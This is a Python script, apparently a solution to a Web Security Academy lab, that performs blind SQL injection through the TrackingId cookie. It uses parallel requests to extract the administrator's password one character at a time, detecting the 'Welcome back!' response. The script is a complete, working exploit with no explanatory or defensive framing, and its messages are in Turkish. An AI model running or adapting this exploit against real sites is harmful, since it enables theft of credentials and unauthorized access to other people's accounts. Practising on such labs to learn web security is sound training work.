import requests
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://0aaa00e704c120b6a3f6eaf500460089.web-security-academy.net/login"
session_cookie = 'rB3nTxpTouENNHyyfVUPZHlncgrQgtR5'  # Kendi session ID'n
base_tracking_id = 'EXSywlLdxKEBR0RY'
success_indicator = "Welcome back!"
charset = string.ascii_lowercase + string.digits
max_length = 30
headers = {'User-Agent': 'Mozilla/5.0'}
thread_pool_size = len(charset)

def try_char(position, char):
    injected_tracking_id = f"{base_tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}'--"
    cookies = {
        'session': session_cookie,
        'TrackingId': injected_tracking_id
    }
    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        if success_indicator in response.text:
            return char
    except requests.RequestException:
        pass
    return None

def main():
    found_password = ""
    print("[*] Parola çözülüyor (paralel)...\n")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=thread_pool_size) as executor:
        for position in range(1, max_length + 1):
            found_char = None
            futures = {executor.submit(try_char, position, c): c for c in charset}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_char = result
                    break
            if found_char:
                found_password += found_char
                print(f"[+] {position}. karakter bulundu: '{found_char}' -> {found_password}")
            else:
                print(f"[-] {position}. karakter bulunamadı. Parola bitti olabilir.")
                break

    elapsed = time.time() - start_time
    print(f"\n[✔] Tam parola: {found_password}")
    print(f"[⏱️] Toplam süre: {elapsed:.2f} saniye")

if __name__ == "__main__":
    main()
